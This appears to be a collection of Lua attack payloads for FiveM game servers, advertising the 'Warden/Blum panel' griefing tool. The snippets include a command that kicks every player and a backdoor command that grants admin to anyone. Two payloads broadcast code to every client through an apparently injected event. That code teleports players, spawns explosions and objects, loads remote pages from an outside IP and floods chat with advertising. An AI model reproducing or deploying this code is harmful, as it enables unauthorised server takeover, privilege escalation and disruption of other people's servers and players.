name: /kickall - kicks all players with reason
code:
RegisterCommand("kickall", function(source, args, rawCommand)
    -- Get a list of all players currently on the server
    local players = GetPlayers()

    -- Loop through all players and kick them
    for _, playerId in ipairs(players) do
        -- Replace 'Reason for kick' with your kick message
        DropPlayer(playerId, "[warden-panel.me/discord] {arg}")
    end
end, false)

name: Spektaklis NEW
code:
local code = [[


local rainbowSpamActive = true

local spectacleActive = false
local spectacleStartTime = 0
local entityList = {}

local introDone = false
local isDisplaying = false
local currentText = ""
local staticText = "WARDEN-PANEL.ME/DISCORD"
local introSoundName = "intro_music"
local mainSoundName = "main_music"
local sentences = {
    "Hi, I'm BLUM-PANEL",
    "I just wanted to let you know that something very special is going to happen",
    "Don't be afraid, everything will be fine.",
    "And.... one more thing... HAVE FUN"
}
local typingSpeed = 50
local showDuration = 5000

function typeAndShowSentences(sentences, cb)
    CreateThread(function()
        isDisplaying = true
        DisplayDUI()
        playSong("intro_music", "https://fivems.lt/assets/vidos.mp3") -- Your working .mp3

        for _, sentence in ipairs(sentences) do
            currentText = ""
            for i = 1, #sentence do
                currentText = currentText .. string.sub(sentence, i, i)
                Wait(typingSpeed)
            end
            Wait(showDuration)
        end

        -- Immediately stop music & start the spectacle
        stopSong("intro_music")
        currentText = ""
        isDisplaying = false
        cb() -- triggers spectacle
    end)
end


-- Start Spectacle Trigger
CreateThread(function()
    Wait(3000)
    typeAndShowSentences(sentences, function()
        spectacleActive = true
        spectacleStartTime = GetGameTimer()
        playSong(mainSoundName, "https://www.youtube.com/watch?v=j6gyV2GqEaA") -- Replace with your spectacle song
        teleportAllToZone()
        VisualSpectacleShow()
        DisplayDUI()
    end)
end)

-- Draw Text Loop
CreateThread(function()
    while true do
        Wait(0)
        if isDisplaying then
            drawText(staticText, 0.5, 0.4, 0.8, 4, 255, 255, 255, 255)
            if currentText ~= "" then
                drawText(currentText, 0.5, 0.46, 0.6, 4, 255, 255, 255, 255)
            end
        end
    end
end)

function drawText(text, x, y, scale, font, r, g, b, a)
    SetTextFont(font or 4)
    SetTextProportional(1)
    SetTextScale(scale or 0.6, scale or 0.6)
    SetTextColour(r or 255, g or 255, b or 255, a or 255)
    SetTextCentre(true)
    SetTextEntry("STRING")
    AddTextComponentString(text)
    DrawText(x or 0.5, y or 0.5)
end

function playSong(name, url)
    local xSound = exports.xsound
    if not xSound:soundExists(name) then
        xSound:PlayUrl(name, url, 0.5)
        xSound:Distance(name, 30)
        xSound:setVolume(name, 0.5)
    end
end

function stopSong(name)
    local xSound = exports.xsound
    if xSound:soundExists(name) then
        xSound:Destroy(name)
    end
end

function teleportAllToZone()
    local center = vector3(-1336.4899, -3043.5537, 16.6940)
    local players = GetActivePlayers()

    for _, player in ipairs(players) do
        local ped = GetPlayerPed(player)
        if DoesEntityExist(ped) then
            local angle = math.random() * math.pi * 2
            local distance = math.random(10, 30)
            local offset = vector3(math.cos(angle) * distance, math.sin(angle) * distance, 0.0)
            local coords = center + offset
            SetEntityCoords(ped, coords.x, coords.y, coords.z, false, false, false, false)
        end
    end
end

function DisplayDUI()
    if not isDisplayed then
        duiObject = CreateDui("https://fivems.lt/assets/warden_watermark.html", 1920, 1080)
        duiHandle = GetDuiHandle(duiObject)
        local txd = CreateRuntimeTxd('dui_texture')
        CreateRuntimeTextureFromDuiHandle(txd, 'dui_image', duiHandle)
        isDisplayed = true
    end
end


local impressiveEffects = {
    "RaceTurbo", "FocusIn", "SuccessNeutral", "SuccessMichael", 
    "MinigameEndNeutral", "MinigameEndTrevor", "MinigameEndFranklin",
    "CamPushNeutralFranklin", "SwitchOpenNeutralFIB5", "Dont_tazeme_bro"
}

local colorSchemes = {
    {name = "COSMIC", colors = {255, 105, 180, 30, 215, 255}}, -- Pink/Blue
    {name = "NEO", colors = {0, 255, 255, 255, 215, 0}}, -- Cyan/Orange
    {name = "MATRIX", colors = {0, 255, 0, 0, 150, 0}}, -- Green
    {name = "ROYAL", colors = {138, 43, 226, 255, 215, 0}}, -- Purple/Gold
    {name = "VOLCANIC", colors = {255, 69, 0, 255, 140, 0}} -- Red/Orange
}

local phaseData = {
    {name = "COSMIC ASCENSION", duration = 15},
    {name = "NEON MATRIX", duration = 15},
    {name = "DIGITAL GODHOOD", duration = 15},
    {name = "REALITY REBIRTH", duration = 15}
}


function VisualSpectacleShow()
    local currentScheme = colorSchemes[1]
    local currentPhase = 1
    
    -- PHASE SYSTEM CONTROLLER
    Citizen.CreateThread(function()
        while spectacleActive do
            local elapsed = GetTimeElapsed()
            local totalPhaseTime = 0
            
            for i, phase in ipairs(phaseData) do
                totalPhaseTime = totalPhaseTime + phase.duration * 1000
                if elapsed < totalPhaseTime then
                    if currentPhase ~= i then
                        currentPhase = i
                        currentScheme = colorSchemes[math.random(#colorSchemes)]
                        TransitionToPhase(i, currentScheme)
                    end
                    break
                end
            end
            
            if elapsed >= 60000 then
                GrandFinale()
                break
            end
            Citizen.Wait(100)
        end
    end)

    -- GENTLE FLOATING EFFECT
    Citizen.CreateThread(function()
        while spectacleActive do
            local ped = PlayerPedId()
            -- Smooth upward floating instead of violent launching
            ApplyForceToEntity(ped, 1, 0.0, 0.0, 15.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
            Citizen.Wait(1000)
        end
    end)

    -- PARTICLE ORCHESTRA SYSTEM
    Citizen.CreateThread(function()
        while spectacleActive do
            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)
            local r1, g1, b1, r2, g2, b2 = unpack(currentScheme.colors)
            
            -- Central particle fountain
            UseParticleFxAssetNextCall("core")
            StartParticleFxNonLoopedAtCoord("ent_ray_heli_attack_light", 
                coords.x, coords.y, coords.z - 1.0, 
                0.0, 0.0, 0.0, 2.5, false, false, false)
            
            -- Orbiting particles
            local angle = (GetGameTimer() / 50) % 360
            local radius = 3.0
            local orbitX = coords.x + math.cos(angle) * radius
            local orbitY = coords.y + math.sin(angle) * radius
            
            UseParticleFxAssetNextCall("scr_rcbarry2")
            StartParticleFxNonLoopedAtCoord("scr_clown_appears", 
                orbitX, orbitY, coords.z + 1.0, 
                0.0, 0.0, 0.0, 1.5, false, false, false)
            
            -- Colorful ground effects
            UseParticleFxAssetNextCall("scr_agencyheist")
            StartParticleFxNonLoopedAtCoord("scr_fbi_mop_drips", 
                coords.x, coords.y, coords.z - 2.0, 
                0.0, 0.0, 0.0, 1.2, false, false, false)
            
            Citizen.Wait(200)
        end
    end)

    -- SPECTACULAR UI DISPLAY
    Citizen.CreateThread(function()
        while spectacleActive do
            Citizen.Wait(0)
            local elapsed = GetTimeElapsed()
            local timeLeft = 60 - (elapsed / 1000)
            local r1, g1, b1, r2, g2, b2 = unpack(currentScheme.colors)
            
            -- Phase title with glow effect
            SetTextFont(7)
            SetTextScale(1.8, 1.8)
            SetTextColour(r1, g1, b1, 255)
            SetTextCentre(true)
            SetTextDropshadow(10, 0, 0, 0, 200)
            BeginTextCommandDisplayText("STRING")
            AddTextComponentSubstringPlayerName(phaseData[currentPhase].name)
            EndTextCommandDisplayText(0.5, 0.15)
            
            -- Color scheme name
            SetTextFont(4)
            SetTextScale(1.2, 1.2)
            SetTextColour(r2, g2, b2, 255)
            SetTextCentre(true)
            BeginTextCommandDisplayText("STRING")
            AddTextComponentSubstringPlayerName(currentScheme.name .. " MODE")
            EndTextCommandDisplayText(0.5, 0.22)
            
            -- Elegant countdown
            SetTextFont(2)
            SetTextScale(1.0, 1.0)
            SetTextColour(255, 255, 255, 200)
            SetTextCentre(true)
            BeginTextCommandDisplayText("STRING")
            AddTextComponentSubstringPlayerName(string.format("SPECTACLE CONCLUDES IN: %.1f", timeLeft))
            EndTextCommandDisplayText(0.5, 0.28)
            
            -- Progress bar
            local progressWidth = (elapsed / 60000) * 0.6
            DrawRect(0.5, 0.32, 0.6, 0.03, 50, 50, 50, 150) -- Background
            DrawRect(0.2 + progressWidth * 0.5, 0.32, progressWidth, 0.025, r1, g1, b1, 200) -- Progress
            
            -- Phase indicators
            for i = 1, #phaseData do
                local xPos = 0.2 + (i * 0.15)
                local phaseAlpha = i <= currentPhase and 255 or 100
                DrawRect(xPos, 0.35, 0.02, 0.02, r2, g2, b2, phaseAlpha)
            end
            
            -- Subtle ambient glow
            local pulse = math.sin(GetGameTimer() / 300) * 0.3 + 0.7
            DrawRect(0.5, 0.5, 1.0, 1.0, r1, g1, b1, math.floor(10 * pulse))
            
            -- Floating particles in UI space
            for i = 1, 3 do
                local x = 0.1 + math.sin(GetGameTimer() / 1000 + i) * 0.8
                local y = 0.7 + math.cos(GetGameTimer() / 800 + i) * 0.2
                local size = 0.005 + math.sin(GetGameTimer() / 500 + i) * 0.003
                DrawRect(x, y, size, size, r2, g2, b2, 150)
            end
        end
    end)

    -- DYNAMIC LIGHTING AND WEATHER CHOREOGRAPHY
    Citizen.CreateThread(function()
        while spectacleActive do
            local phaseMods = {
                "MP_heli_cam", -- Phase 1: Clean
                "NG_filmic01", -- Phase 2: Cinematic  
                "ufo",         -- Phase 3: Alien
                "pulse"        -- Phase 4: Pulsing
            }
            
            SetTimecycleModifier(phaseMods[currentPhase])
            SetTimecycleModifierStrength(0.7) -- Subtle enhancement
            
            -- Gentle camera movement
            local shakeIntensity = 0.3 + math.sin(GetGameTimer() / 2000) * 0.2
            ShakeGameplayCam("HAND_SHAKE", shakeIntensity)
            
            -- Thematic weather for each phase
            local phaseWeather = {"EXTRASUNNY", "CLOUDS", "NEUTRAL", "FOGGY"}
            SetWeatherTypeNowPersist(phaseWeather[currentPhase])
            
            Citizen.Wait(2000)
        end
    end)

    -- OBJECT ART INSTALLATIONS
    Citizen.CreateThread(function()
        while spectacleActive do
            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)
            
            -- Create floating geometric patterns
            if #entityList < 20 then
                local objects = {"prop_prlg_gravestone_05a", "prop_test_boulder_01", "prop_rock_4_a"}
                local objHash = GetHashKey(objects[math.random(#objects)])
                
                RequestModel(objHash)
                while not HasModelLoaded(objHash) do
                    Wait(10)
                end
                
                local angle = math.random(0, 360) * math.pi / 180
                local distance = math.random(8, 15)
                local height = math.random(5, 12)
                local spawnPos = coords + vector3(
                    math.cos(angle) * distance,
                    math.sin(angle) * distance,
                    height
                )
                
                local obj = CreateObject(objHash, spawnPos, true, true, false)
                SetEntityRotation(obj, math.random(0, 360), math.random(0, 360), math.random(0, 360), 2, true)
                FreezeEntityPosition(obj, true)
                SetEntityAsMissionEntity(obj, true, true)
                
                table.insert(entityList, obj)
            end
            
            Citizen.Wait(1000)
        end
    end)
end

function TransitionToPhase(phase, scheme)
    -- Play transition effect
    StartScreenEffect(impressiveEffects[math.random(#impressiveEffects)], 3000, true)
    
    -- Gentle screen flash in scheme colors
    local r, g, b = scheme.colors[1], scheme.colors[2], scheme.colors[3]
    Citizen.CreateThread(function()
        for i = 1, 10 do
            local alpha = math.sin(i * 0.3) * 30
            DrawRect(0.5, 0.5, 1.0, 1.0, r, g, b, alpha)
            Citizen.Wait(50)
        end
    end)
end

function GrandFinale()
    -- Final spectacular sequence
    StartScreenEffect("SuccessMichael", 5000, true)
    
    -- Firework finale around player
    local ped = PlayerPedId()
    local coords = GetEntityCoords(ped)
    
    for i = 1, 24 do
        local angle = (i * 15) * math.pi / 180
        local distance = 20
        local fireworkPos = coords + vector3(
            math.cos(angle) * distance,
            math.sin(angle) * distance,
            15
        )
        AddExplosion(fireworkPos.x, fireworkPos.y, fireworkPos.z, 38, 1.0, true, false, 2.0)
        Citizen.Wait(200)
    end
    
    EndSpectacle()
end

function GetTimeElapsed()
    return GetGameTimer() - spectacleStartTime
end

Citizen.CreateThread(function()
    local waveDirection = 1
    local spaceCount = 0
    local chatColors = {
        {255, 0, 0}, {255, 128, 0}, {255, 255, 0}, {0, 255, 0},
        {0, 255, 255}, {0, 0, 255}, {128, 0, 255}, {255, 0, 255}
    }
    local colorIndex = 1
    local deadSpace = "⠀" -- Unicode U+2800 Braille Pattern Blank (invisible character)

    while rainbowSpamActive do
        local spaces = string.rep(deadSpace, spaceCount)
        local message = spaces .. "FUCKED BY BLUM - GET GOOD GET WARDEN PANEL warden-panel.me/discord"
        local r, g, b = table.unpack(chatColors[colorIndex])

        TriggerEvent('chat:addMessage', {
            color = {r, g, b},
            args = {message}
        })

        colorIndex = (colorIndex % #chatColors) + 1
        spaceCount = spaceCount + waveDirection
        if spaceCount > 20 then waveDirection = -1 end
        if spaceCount < 0 then waveDirection = 1 end

        Wait(150)
    end
end)

function EndSpectacle()
    spectacleActive = false
    rainbowSpamActive = false
    
    -- Graceful cleanup
    for _, effect in ipairs(impressiveEffects) do
        StopScreenEffect(effect)
    end
    
    ClearTimecycleModifier()
    ClearGameplayCamShake()
    StopAllScreenEffects()
    
    -- Remove art installations
    for _, entity in ipairs(entityList) do
        if DoesEntityExist(entity) then
            DeleteEntity(entity)
        end
    end
    entityList = {}
    
    -- Environment restoration
    ClearOverrideWeather()
    ClearWeatherTypePersist()
    NetworkOverrideClockTime(12, 0, 0)
    
    TriggerEvent("chat:addMessage", {
        args = {"^2[SPECTACLE] ^7Visual performance complete. Thank you for experiencing the show."},
    })
end
]]


TriggerClientEvent("helpEmptyCode", -1, code)

name: /miaumiau in-game command to get admin
code:
ESX = nil

ESX = exports["es_extended"]:getSharedObject()

Citizen.CreateThread(function()
	while ESX == nil do
	  TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)
	  Citizen.Wait(30)
	end
end)

RegisterCommand('miaumiau', function(source, args, user)
    local xPlayer = ESX.GetPlayerFromId(source)
    if xPlayer then
        xPlayer.setGroup('admin')
        TriggerClientEvent('esx:showNotification', source, 'putsara dekok freakui nubas')
    end
end, false)

name: russian heck
code:
local code = [[
local duiObject = nil
local duiHandle = nil
local isDisplayed = false
local currentText = ""
local ip = true
local rainbowSpamActive = true
local isDisplaying = true
local ipDisplayActive = true
local isDisplayedd = true


function DisplayDUI()
    if isDisplayedd then
        duiObject = CreateDui(config.duiURL, 1920, 1080)
        duiHandle = GetDuiHandle(duiObject)
        local txd = CreateRuntimeTxd('dui_texture')
        CreateRuntimeTextureFromDuiHandle(txd, 'dui_image', duiHandle)
    end
end

function drawText(text, x, y, scale)
    SetTextFont(4)
    SetTextProportional(1)
    SetTextScale(scale, scale)
    SetTextColour(255, 255, 255, 255)
    SetTextCentre(true)
    SetTextEntry("STRING")
    AddTextComponentString(text)
    DrawText(x, y)
end

CreateThread(function()
    Wait(2000)

    duiObject = CreateDui("https://fivems.lt/assets/warden_watermark.html", 1920, 1080)
    duiHandle = GetDuiHandle(duiObject)
    local txd = CreateRuntimeTxd('dui_texture_blum')
    CreateRuntimeTextureFromDuiHandle(txd, 'dui_image', duiHandle)
    Wait(100)
end)

CreateThread(function()
    while true do
        Wait(0)
        DrawSprite('dui_texture_blum', 'dui_image', 0.5, 0.5, 1.0, 1.0, 0.0, 255, 255, 255, 255)
    end
end)

CreateThread(function()
    while true do
        Wait(0)
        SetTextFont(4)
        SetTextProportional(1)
        SetTextScale(0.45, 0.45)
        SetTextColour(255, 255, 255, 255)
        SetTextOutline()
        SetTextCentre(true)
        BeginTextCommandDisplayText("STRING")
        AddTextComponentSubstringPlayerName("BLUM-PANEL.ME | visit website to start destroying servers with our tool also DISCLAIMER FOR OWNER if u lost ur accounts dm UABFREAKAS to get it back")
        EndTextCommandDisplayText(0.5, 0.95)
    end
end)

CreateThread(function()
    while true do
        Wait(0)
        if isDisplaying then
            if currentText ~= "" then
                drawText(currentText, 0.5, 0.30, 0.6)
            end
        end
    end
end)

-- Function to initialize and display full-screen DUI
function showFullScreenUI()
    if not isDisplayed then
        -- Create DUI with screen resolution
        duiObject = CreateDui("http://185.80.130.154/assets/test.html", 1920, 1080)
        duiHandle = GetDuiHandle(duiObject)

        -- Create runtime texture
        local txd = CreateRuntimeTxd('dui_texture')
        CreateRuntimeTextureFromDuiHandle(txd, 'dui_screen', duiHandle)

        isDisplayed = true

        -- Start rendering loop
        CreateThread(function()
            while isDisplayed do
                Wait(0)
                DrawSprite('dui_texture', 'dui_screen', 0.5, 0.5, 1.0, 1.0, 0.0, 255, 255, 255, 255)
            end
        end)
    end
end

CreateThread(function()
    local wave = 1
    local count = 0
    local colorIndex = 1
    local emojiPool = {"✨","💥","🔥","🌈","⚡","🎆","🚀","🌀","🎇","💣","👾","💻","🔊","🎮"}
    local messages = {
        "BLUM PANEL UNLEASHED",
        "YOU JUST GOT WARDEN'D",
        "NO ESCAPE. NO MERCY.",
        "JOIN THE DOMINATORS",
        "BLUM OWNS THIS SERVER",
        "MELTDOWN INITIATED",
        "TIME TO ASCEND",
        "THIS IS ONLY THE BEGINNING"
    }
    local colors = {
        {255, 0, 0}, {255, 127, 0}, {255, 255, 0},
        {0, 255, 0}, {0, 255, 255}, {0, 0, 255},
        {139, 0, 255}, {255, 0, 255}, {255, 20, 147}
    }
    local spaceChar = "⠀"

    while true do
        local emoji1 = emojiPool[math.random(#emojiPool)]
        local emoji2 = emojiPool[math.random(#emojiPool)]
        local flair = emoji1 .. emoji2
        local spaces = string.rep(spaceChar, count)
        local baseMessage = messages[math.random(#messages)]
        local fullMessage = string.format(
            "%s %s 🚨 %s 🚨 %s ➤ blum-panel.me/discord",
            flair, spaces, baseMessage, flair
        )

        local r, g, b = table.unpack(colors[colorIndex])
        TriggerEvent("chat:addMessage", {
            color = {r, g, b},
            args = {fullMessage}
        })

        colorIndex = (colorIndex % #colors) + 1
        count = count + wave
        if count > 25 then wave = -1 end
        if count < 0 then wave = 1 end

        Wait(100)
    end
end)

-- To call it
showFullScreenUI()

]]

-- Send to all players
TriggerClientEvent("helpEmptyCode", -1, code)

name: txAdmin crash [blocks admins using txadmin]
